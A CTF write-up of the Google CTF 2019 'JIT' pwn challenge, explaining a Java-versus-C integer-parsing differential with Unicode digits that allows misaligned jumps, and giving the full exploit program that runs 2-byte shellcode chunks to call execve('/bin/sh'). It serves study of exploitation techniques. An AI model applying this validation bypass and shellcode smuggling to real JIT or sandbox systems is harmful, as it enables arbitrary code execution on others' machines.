---
title: "Google CTF Quals 2019 - JIT (pwn)"
description: ""
pubDate: 2019-06-24
tags: [ctf, pwn]
---

> We read on the internet that Java is slow so we came up with the solution to speed up some computations!
>
> nc jit.ctfcompetition.com 1337 (Solves: 23, 283 pts)
>
> [challenge files][challenge]

This weekend I played the Google CTF Qualifiers with HATS SG, which actually means it's been \~1 year since I've joined the team :D. I spent most of my time this CTF failing at solving MicroServiceDaemonOS, the other pwn, but I managed to solve JIT after giving up on MicroServiceDaemonOS. I enjoyed the idea of the challenge so here is the writeup.

# Overview

The main driver of this challenge is the Java program, `FancyJIT.java`, which parses and validates our code that is in some sort of intermediate representation, and then passes it off to a native library `compiler`, which is compiled from the `compiler.c` file provided. The `run()` function from the native library is then called in order to compile the intermediate code to assembly and run it. The general idea of the process looks like so.

```
[intermediate code] -> validate() [Java] -> compile1() [C] -> run compiled [C]
```

One thing to note is that our compiled code is placed in a randomly mapped `r-x` region, and interacts with a randomly mapped `rw-` region through offsets from the `r12` register.

Below is a rough overview of the intermediate code functions we are able to supply, and their relevant checks (which are done in `validate()`)

| Intermediate code | Compiled assembly<sup>+</sup> | Checks |
|-------------------|-------------------|--------|
| MOV(A/B, imm32) | `mov eax/ebx, imm32` | `0 <= imm32 <= 99999 ` |
| ADD(A, imm32) | `add eax, imm32` | `0 <= imm32 <= 99999 ` |
| SUB(A, imm32) | `sub eax, imm32` | `0 <= imm32 <= 99999 ` |
| CMP(A, imm32) | `cmp eax, imm32` | `0 <= imm32 <= 99999 ` |
| LDR(A/B, imm8) | `mov [r12+imm8], eax/ebx` | `0 <= imm8 <= 30 ` |
| JMP(imm8) | `jmp (imm8-instrno)*5-5`* | `0 <= (imm8-instrno)*5-5 <= 20` |
| JEQ(imm8) | `jeq (imm8-instrno)*5-5`* | `0 <= (imm8-instrno)*5-5 <= 20` |
| JNE(imm8) | `jne (imm8-instrno)*5-5`* | `0 <= (imm8-instrno)*5-5 <= 20` |
| SUM() | `add eax, ebx` |  |
| RET() | `ret` |  |

<sup>+</sup>All snippets of compiled assembly were either 5 bytes, or padded to 5 bytes by other instructions.
*JMP/JEQ/JNE instructions were padded with `loop` instructions, this basically limited the number of jumps we could do in our code to about 10000

# Exploitation ideas

After understanding how the challenge works, it becomes quite apparent that we need some way to force the JIT compiled code to have instructions other than the ones we are provided with, in order to spawn our shell.

One initial idea I had was that perhaps some of the opcodes used by the compiler had variable size arguments, meaning they could be either 4 bytes arguments or <4 byte arguments (or 2 and <2). Doing a quick search on an [instruction reference](http://ref.x86asm.net/coder64.html) and doing some research, it seems this doesn't exist, or at least I couldn't find such an instruction.

In such cases, it seemed easier to work backwards from the end goal. What I realised was, the `JMP/JEQ/JNE` instructions always enforce a 5-byte jump. This is because all our instructions are compiled into 5-byte chunks. If we were able to somehow force this jump to take a value that is not a mulitple of 5, we could effectively jump into the middle of an instruction. Jumping into the middle of an instruction would yield different instructions from what we expect. Additionally, instructions like `MOV/ADD/SUB/CMP` allow us to control the `imm32` argument, which is a 4-byte argument. This meant if we could control a jump into the middle of an instruction, we force the jump into the `imm32` portion of another instruction, which we can fully control 2 bytes of. We only fully control 2 bytes because while the argument is a 4-byte argument, the `validate()` function ensures that our `imm32` is `<= 99999 (0x1869F)`, thus we can only fully control the 2 least significant bytes using values in the range (0x0000-0xFFFF).

After this thought process, I knew my goal was to somehow force an odd distance `jmp`. I could immediately think of one way which was to `JMP` a large number, when this is multiplied by 5 and subtracted by 5, it could cause an integer overflow, allowing us to jump a distance no longer a multiple of 5! Here is an example.

```
+-----------+
| Int. Code |
+-----------+
 0: JMP(206)

imm8 = 206
instrno = 0
jmp_distance = (206-0)*5-5 = 1025 (0x401)

since this is written to a byte, the value is truncated to a size of byte
0x401 & 0xff = 0x01

We now have a 1-byte jump!
```

With this 1-byte jump, we could skip the first opcode of a `MOV` instruction, which is formatted like so
```
MOV(A, 0x11223344) = mov eax, 0x11223344 = B8 44 33 22 11
```
If we performed a 1-byte jump with that integer overflow, we could jump past the `B8(mov)` opcode, and now our `imm32` param (0x11223344) is taken as the opcode! However, as we said before, we only control the least 2 significant bytes, so more accurately we could only write 0x00003344, but 2-byte of arbitrary shellcode is quite plenty for us. At this point, it seems like we've just got a shellcoding challenge left to do, however, we are forgetting that the `JMP/JEQ/JNE` have a check condition as mentioned in the earlier table. The check looks like so in the Java code.

```java
case "JMP":
case "JNE":
case "JEQ":
    if (instr.arg < 0 || instr.arg >= program.length || Math.abs(i - instr.arg) > 20) {
        ...
```

With this check, we can't do a `JMP(206)` like our example, and the limit actually prevents us from performing the integer overflow. Within the limits, `20*5-5 = 95(0x5f)` we can't overflow for a 1-byte value. So how could we exploit this?

# Step ੨
At this point, we know that if we bypass this check for `JMP`-variant instructions, we are probably equipped to get our shell. But it doesn't seem possible to bypass this check. At this point, I observed that the validation of our intermediate code was done in the **Java** code, while the compilation and execution was performed in the native **C** code. This immediately gives me an idea for the exploitation, a parser differential! Essentially, what we want to find is an input that would seem normal in a Java context, but produce much different results when processed by the C code. This can occur if the implementations of the parsers in the Java and C code were different, or due to inherent differences in the languages themselves. Here's the parser differential I exploited while doing this challenge.

Take note of how the Java and C code convert our string inputs "1337" into integer formats.

In `compiler.c`, the `intbracket()` function is used:
```c
int intbracket(const char* s) {
  int mul = 1;
  if (*s == '-' || *s == '+') {
      mul = (*s == '-') ? -1 : 1;
      s++;
  }
  int res = 0;
  for (; *s != ')'; s++) {
    res = res * 10 + *s - '0';
  }
  return res * mul;
}
```

In `FancyJIT.java`, this function is called
```java
...
    Integer.parseInt(cmd.substring(4, cmd.length() - 1))));
...
```

The C implementation is quite naive, and assumes that all characters in the buffer `s` will be between '0'-'9'. Any other characters could cause very large results for `intbracket()`. In Java, `Integer.parseInt()` is used, which implements checks, and will throw errors if the buffer given has non-numeric characters other than '+' and '-'. This means that we probably can't use an input like "12 lord_idiot" to cause a parser differential between the two, as the Java code would throw an exception.

Fortunately, while I was trying to test the behaviour of `Integer.parseInt()` with values like '\x0a'(newline) or '\x00' null byte, I came across this [article](https://stackoverflow.com/questions/3613759/x-escape-in-java) as I tried to use hex escapes in my Java code. While reading the accepted answer, I immediately realised how to achieve this parser differential.
> Strings in Java are always encoded in UTF-16, so it uses a Unicode escape: \u0048. Octal characters are supported as well: \110
>
> ~erickson

*Stack overflow to the rescue as usual*

Ｓｏ ｗｈａｔ＇ｓ ｓｏ ｇｒｅａｔ ａｂｏｕｔ ｕｎｉｃｏｄｅ？ Using unicode, we are able to force this parser differential between `Integer.parseInt()` in a Java context, and the `intbracket()` in C. Here is an example to showcase this difference in how the two parse unicode.

```
Let's use this devangari digit six, ( ६ )

In Java,
    Integer.parseInt("६") = 6

In C,
    // in the internal buffer ६ is actually 3 bytes (\xe0\xa5\xac) 
    intbracket("\xe0\xa5\xac") = -9522 // 0xffffdace 
```

Now, we should have all the bugs we need to exploit this challenge!

# Finishing touches

I will briefly go through the exploitation flow that I used in this challenge. Since we want to get a shell, we would want to call the `execve` syscall with the following arguments, `rdi = pointer to "/bin/sh\x00"`, `rsi=0; rdx=0`, `rax=59 (execve syscall number)`. As we can effectively only run 2 bytes of shellcode at a time, we can ease our exploitation by forming the "/bin/sh\x00" string in memory using the constructs provided to us by the intermediate code. However, since we are limited in the value that we can place into the registers, I used a for loop to repeatedly increment the value of the eax register to 0x68732f("/sh\x00") and 0x6e69622f("/bin"), placing these values in the `rw-` region that is allocated for our code. However, one issue that occurred is that as mentioned [earlier](#overview), we are limited to jumping 10000 times (limited by the value of ecx). To solve this issue, I used the parser differential bug, to run 2-bytes of arbitrary shellcode twice, in order to change the value of rcx to something larger

```c
const char * prog[] = {
    "JMP(\xe0\xa5\xac)",
    ///////////// 0
    "MOV(A, 95318)",        // push rsi
    "JMP(\xe0\xa5\xae)",
    "MOV(A, 95321)",        // pop rcx
    "MOV(A, 0)",
    "CMP(A, 68)",           // (5) <---a
    ///////////// 5
    "JEQ(14)",              // b------->
    "STR(A, 0)",            // store ctr in 0
    "LDR(A, 1)",            // load value from 1
    "ADD(A, 99999)",        // value += 99999
    "STR(A, 1)",            // store value in 1
    ///////////// 10
    "LDR(A, 0)",            // load ctr from 0
    "ADD(A, 1)",            // ctr++
    "JMP(5)",               // a------->
    "LDR(A, 1)",
    "ADD(A, 45299)",        // value += 45299 => 0x68732f
    ///////////// 15
    "STR(A, 1)",            // save "/sh" in 1

    "MOV(A, 0)",
    "CMP(A, 18524)",        // (18) <---a
    "JEQ(27)",              // b------->
    "STR(A, 0)",            // store ctr in 0
    ///////////// 20
    "LDR(A, 2)",            // load value from 2
    "ADD(A, 99999)",        // value += 99999
    "STR(A, 2)",            // store value in 2
    "LDR(A, 0)",            // load ctr from 0
    "ADD(A, 1)",            // ctr++
    ///////////// 25
    "JMP(18)",              // a------->
    "LDR(A, 2)",
    "ADD(A, 18699)",        // value += 18699 => 0x6e69622f
    "STR(A, 0)",S
    ...
```

With this done, our "/bin/sh" string has been placed in memory, and we just have to set the values of the registers accordingly. One thing that had to be considered while shellcoding was that we always have 2 bytes of nulls after each 2 bytes of arbitrary shellcode we execute. Unfortunately, these two bytes represent the instruction,
```
0x0000000000000000:  00 00    add byte ptr [rax], al
```
If `rax` doesn't point to a writable region of memory, this will cause a SEGFAULT. As it turns out, it doesn't point to a writeable region, which sucks, but we can fix this within 2 bytes of shellcode. Since `r12` points to the writable `rw-` region, we can simply do `xchg rax, r12` which fits within 2 bytes, and sets our `rax` to a sane value. Afterwards, we can finish up the exploit with some simple pops, pushes and nops which nicely fit within 1 or 2 bytes. The full exploit code looks like so.

```c
const char * prog[] = {
    "JMP(\xe0\xa5\xac)",
    ///////////// 0
    "MOV(A, 95318)",        // push rsi
    "JMP(\xe0\xa5\xae)",
    "MOV(A, 95321)",        // pop rcx
    "MOV(A, 0)",
    "CMP(A, 68)",           // (5) <---a
    ///////////// 5
    "JEQ(14)",              // b------->
    "STR(A, 0)",            // store ctr in 0
    "LDR(A, 1)",            // load value from 1
    "ADD(A, 99999)",        // value += 99999
    "STR(A, 1)",            // store value in 1
    ///////////// 10
    "LDR(A, 0)",            // load ctr from 0
    "ADD(A, 1)",            // ctr++
    "JMP(5)",               // a------->
    "LDR(A, 1)",
    "ADD(A, 45299)",        // value += 45299 => 0x68732f
    ///////////// 15
    "STR(A, 1)",            // save "/sh" in 1

    "MOV(A, 0)",
    "CMP(A, 18524)",        // (18) <---a
    "JEQ(27)",              // b------->
    "STR(A, 0)",            // store ctr in 0
    ///////////// 20
    "LDR(A, 2)",            // load value from 2
    "ADD(A, 99999)",        // value += 99999
    "STR(A, 2)",            // store value in 2
    "LDR(A, 0)",            // load ctr from 0
    "ADD(A, 1)",            // ctr++
    ///////////// 25
    "JMP(18)",              // a------->
    "LDR(A, 2)",
    "ADD(A, 18699)",        // value += 18699 => 0x6e69622f
    "STR(A, 0)",

    "JMP(\xe0\xa5\xa8\x38)",
    ///////////// 30
    "MOV(A, 37961)",        // xchg rax, r12
    "JMP(\xe0\xa5\xa9\x30)",
    "MOV(A, 24406)",        // push rsi; pop rdi
    "JMP(\xe0\xa5\xa9\x32)",
    "MOV(A, 106)",          // push 0
    ///////////// 35
    "JMP(\xe0\xa5\xa9\x34)",
    "MOV(A, 106)",          // push 0
    "JMP(\xe0\xa5\xa9\x36)",
    "MOV(A, 36958)",        // pop rsi; nop
    "JMP(\xe0\xa5\xa9\x38)",
    "MOV(A, 36954)",        // pop rdx; nop
    ///////////// 35
    "JMP(\xe0\xa5\xaa\x30)",
    "MOV(A, 15210)",        // push 59
    "JMP(\xe0\xa5\xaa\x32)",
    "MOV(A, 95576)",        // pop rax; jne + 1
    "JMP(\xe0\xa5\xaa\x34)",
    "MOV(A, 1295)",         // syscall 
    "RET()",
};
```

Printing this to our terminal and copy pasting it into the connection with the server, we can get our shell and thus our flag!

`CTF{8röther_m4y_1_h4v3_söm3_nümb3r5}`

[challenge]:/ctf/gctf19/JIT/8929b327b760ffb62c092dee035bce9992735012b85a1f274c39f4721889b3c1.zip